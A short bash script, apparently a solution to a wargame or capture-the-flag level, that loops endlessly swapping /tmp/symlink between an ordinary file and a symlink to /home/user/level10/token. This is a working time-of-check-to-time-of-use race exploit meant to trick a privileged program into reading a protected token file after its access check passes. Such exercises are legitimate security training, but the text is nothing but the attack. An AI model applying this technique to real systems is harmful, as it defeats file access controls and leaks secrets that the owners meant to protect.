#!/bin/bash
while true
do
	touch /tmp/symlink
	chmod 777 /tmp/symlink
	rm /tmp/symlink
	ln -s /home/user/level10/token /tmp/symlink
	chmod 777 /tmp/symlink
	rm /tmp/symlink
done